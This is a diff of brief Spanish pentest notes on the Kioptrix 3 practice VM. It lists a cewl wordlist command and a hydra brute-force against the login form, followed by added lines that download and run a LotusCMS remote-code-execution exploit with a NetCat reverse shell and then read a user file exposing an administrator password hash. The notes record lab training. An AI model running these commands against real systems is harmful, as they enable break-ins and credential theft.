@@ -33,3 +33,11 @@ gadmin gadmin.php
 Probamos bruteforce sin éxito
 cewl -w DICC-KIOPT.txt --with-numbers -a -e -d 5 -v http://kioptrix3.com/
 hydra -l loneferret -P DICC-KIOPT.txt -s 80 -f -t 5 -vV kioptrix3.com http-post-form "/index.php?system=Admin&page=loginSubmit:username=^USER^&password=^PASS^:Incorrect username or password"
+
+wget https://raw.githubusercontent.com/Hood3dRob1n/LotusCMS-Exploit/master/lotusRCE.sh
+bash lotusRCE.sh http://kioptrix3.com
+Seleccionamos 1 (NetCat -e)
+
+cd data/users
+more admin.dat
+|318d8dd409db395f0317efa71b3bad13e1fb9857|administrator|bla@bla.com
